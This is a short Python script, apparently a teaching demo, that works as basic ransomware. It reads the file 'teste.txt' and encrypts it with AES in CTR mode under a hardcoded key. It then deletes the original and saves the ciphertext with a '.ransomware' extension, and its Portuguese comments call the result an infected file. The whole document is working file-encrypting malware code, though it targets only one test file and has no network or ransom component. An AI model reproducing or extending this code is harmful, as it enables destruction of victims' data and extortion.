import pyaes
import os

## Leitura do conteudo do arquivo
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## criptografar os dados
key = b"diome-13.01.2024"
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

## Fazer replace do arquivo por um arquivo infectado
os.remove(file_name)
new_file = file_name + ".ransomware"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
